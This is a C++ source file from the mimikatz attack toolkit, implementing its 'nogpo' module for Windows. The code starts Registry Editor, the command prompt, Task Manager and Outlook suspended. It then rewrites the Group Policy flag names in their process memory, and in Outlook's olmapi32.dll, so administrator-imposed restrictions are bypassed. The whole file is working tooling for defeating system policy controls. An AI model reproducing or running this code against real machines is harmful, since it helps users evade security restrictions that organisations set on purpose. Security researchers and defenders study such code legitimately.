/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/
*/
#include "mod_mimikatz_nogpo.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_nogpo::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(regedit,	L"regedit",	L"Launches Registry Editor, ignoring DisableRegistryTools"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cmd,		L"cmd",		L"Launches a command prompt, ignoring DisableCMD"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(taskmgr,	L"taskmgr",	L"Launches the task manager, ignoring DisableTaskMgr"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(olpst,	L"olpst",	L"LaunchesOutlook, ignoring DisablePST"));
	return monVector;
}

bool mod_mimikatz_nogpo::regedit(vector<wstring> * arguments)
{
	wcout << L"Registry Editor : " << (disableSimple(L"regedit.exe", L"DisableRegistryTools", L"KiwiAndRegistryTools") ? "OK" : "KO") << endl;
	return true;
}

bool mod_mimikatz_nogpo::cmd(vector<wstring> * arguments)
{
	wcout << L"Command Prompt : " << (disableSimple(L"cmd.exe", L"DisableCMD", L"KiwiAndCMD") ? "OK" : "KO") << endl;
	return true;
}

bool mod_mimikatz_nogpo::taskmgr(vector<wstring> * arguments)
{
	wcout << L"Task Manager : " << (disableSimple(L"taskmgr.exe", L"DisableTaskMgr", L"KiwiAndTaskMgr") ? "OK" : "KO") << endl;
	return true;
}

bool mod_mimikatz_nogpo::olpst(vector<wstring> * arguments)
{
	char szDisable[] = "DisablePst";
	char szKiwi[] = "KiwiAndPst";
	
	wstring pathToOutlook;

	if(getApplicationPathFromCLSID(L"Outlook.Application", &pathToOutlook))
	{
		DWORD pidOutlook = 0;
		bool reussite = disableSimple(pathToOutlook, szDisable, szKiwi, &pidOutlook);
		
		wcout << L"Outlook w/PST   : " << (reussite ? L"OK" : L"KO");
		if(reussite)
		{
			mod_patch::patchModuleOfPID(pidOutlook, L"olmapi32.dll", reinterpret_cast<BYTE *>(szDisable), sizeof(szDisable), reinterpret_cast<BYTE *>(szKiwi), sizeof(szKiwi));
		}
	} else wcout << L"Outlook not found" << endl;
	return true;
}

bool mod_mimikatz_nogpo::getApplicationPathFromCLSID(wstring application, wstring * path)
{
	bool reussite = false;

	DWORD regError;

	wstring pathToApplication = L"Software\\Classes\\";
	pathToApplication.append(application);
	pathToApplication.append(L"\\CLSID");

	HKEY hApplication;

	regError = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pathToApplication.c_str(), 0, KEY_READ, &hApplication);
	if(regError == ERROR_SUCCESS)
	{
		DWORD ApplicationType = 0;
		DWORD ApplicationSize = 0;
		LPBYTE monGUID = NULL;

		regError = RegQueryValueEx(hApplication, L"", NULL, &ApplicationType, monGUID, &ApplicationSize);
		if(regError == ERROR_SUCCESS)
		{
			if(ApplicationType == REG_SZ)
			{
				monGUID = new BYTE[ApplicationSize];

				regError = RegQueryValueEx(hApplication, L"", NULL, &ApplicationType, monGUID, &ApplicationSize);
				if(regError == ERROR_SUCCESS)
				{
					wstring regPathToPath = 
#ifdef _M_X64
						L"Software\\Wow6432Node\\Classes\\CLSID\\";
#elif defined _M_IX86
						L"Software\\Classes\\CLSID\\";
#endif
					regPathToPath.append(reinterpret_cast<wchar_t *>(monGUID));
					regPathToPath.append(L"\\LocalServer32");

					HKEY hApplicationPath;

					regError = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regPathToPath.c_str(), 0, KEY_READ, &hApplicationPath);
					if(regError == ERROR_SUCCESS)
					{
						DWORD ApplicationPathType = 0;
						DWORD ApplicationPathSize = 0;
						LPBYTE monPath = NULL;

						regError = RegQueryValueEx(hApplicationPath, L"", NULL, &ApplicationPathType, monPath, &ApplicationPathSize);
						if(regError == ERROR_SUCCESS)
						{
							if(ApplicationPathType == REG_SZ)
							{
								monPath = new BYTE[ApplicationPathSize];

								regError = RegQueryValueEx(hApplicationPath, L"", NULL, &ApplicationPathType, monPath, &ApplicationPathSize);
								if(reussite = (regError == ERROR_SUCCESS))
								{
									path->assign(reinterpret_cast<wchar_t *>(monPath));
								} else wcout << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
								delete[] monPath;
							} else wcout << "The type returned by \'" << monPath <<  "\' is not : REG_SZ" << endl;
						} else wcout << "RegQueryValueEx \'" << monPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
						RegCloseKey(hApplicationPath);
					} else wcout << "RegOpenKeyEx \'" << regPathToPath <<  "\' : " << mod_system::getWinError(false, regError) << endl;
				} else wcout << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
				delete[] monGUID;
			} else wcout << "The type returned by \'" << monGUID <<  "\' is not : REG_SZ" << endl;
		} else wcout << "RegQueryValueEx \'" << monGUID <<  "\' : " << mod_system::getWinError(false, regError) << endl;
		RegCloseKey(hApplication);
	} else wcout << "RegOpenKeyEx \'" << pathToApplication <<  "\' : " << mod_system::getWinError(false, regError) << endl;

	return reussite;
}


bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, SIZE_T taillePattern, PBYTE maCleDeDepart, const void * maCleFinale, DWORD * monPID)
{
	bool reussite = false;

	PROCESS_INFORMATION * mesInfos = new PROCESS_INFORMATION();
	if(mod_process::start(&commandLine, mesInfos, true))
	{
		PEB * monPeb = new PEB();
		if(mod_process::getPeb(monPeb, mesInfos->hProcess))
		{
			PBYTE patternAddr = NULL;
			// Ici NULL est "tol�r�", pas de moyen simple de connaitre la taille en mode USER :( (enfin pour le moment)
			if(mod_memory::searchMemory(reinterpret_cast<PBYTE>(monPeb->ImageBaseAddress), NULL, maCleDeDepart, &patternAddr, taillePattern, true, mesInfos->hProcess))
			{
				if(!(reussite = mod_memory::writeMemory(patternAddr, maCleFinale, taillePattern, mesInfos->hProcess)))
				{
					wcout << L"mod_memory::writeMemory " << mod_system::getWinError() << endl;
				}
			}
			else wcout << L"mod_memory::searchMemory " << mod_system::getWinError() << endl;
		}
		else wcout << L"mod_process::getPeb " << mod_system::getWinError() << endl;

		delete monPeb;

		if(!(ResumeThread(mesInfos->hThread) != -1))
			wcout << L"ResumeThread " << mod_system::getWinError() << endl;

		if(monPID)
		{
			*monPID = mesInfos->dwProcessId;
		}

		WaitForInputIdle(mesInfos->hProcess, INFINITE);

		CloseHandle(mesInfos->hThread);
		CloseHandle(mesInfos->hProcess);
	}
	else wcout << L"mod_process::execProcess " << mod_system::getWinError() << endl;

	delete mesInfos;

	return reussite;
}

bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, wstring origKey, wstring kiwiKey, DWORD * monPID)
{
	bool reussite = false;

	if(origKey.size() == kiwiKey.size())
	{
		SIZE_T taillePattern = (origKey.size() + 1) * sizeof(wchar_t);
		PBYTE maCleDeDepart = reinterpret_cast<PBYTE>(const_cast<wchar_t *>(origKey.c_str()));
		const void * maCleFinale = kiwiKey.c_str();

		reussite = disableSimple(commandLine, taillePattern, maCleDeDepart, maCleFinale, monPID);
	}
	else wcout << L"mod_mimikatz_nogpo::disableSimple (unicode) Size of the original pattern different than pattern of target" << endl;

	return reussite;
}

bool mod_mimikatz_nogpo::disableSimple(wstring commandLine, string origKey, string kiwiKey, DWORD * monPID)
{
	bool reussite = false;

	if(origKey.size() == kiwiKey.size())
	{
		SIZE_T taillePattern = (origKey.size() + 1) * sizeof(char);
		PBYTE maCleDeDepart = reinterpret_cast<PBYTE>(const_cast<char *>(origKey.c_str()));
		const void * maCleFinale = kiwiKey.c_str();

		reussite = disableSimple(commandLine, taillePattern, maCleDeDepart, maCleFinale, monPID);
	}
	else wcout << L"mod_mimikatz_nogpo::disableSimple (non-unicode) Size of the original pattern different than pattern of target" << endl;

	return reussite;
}
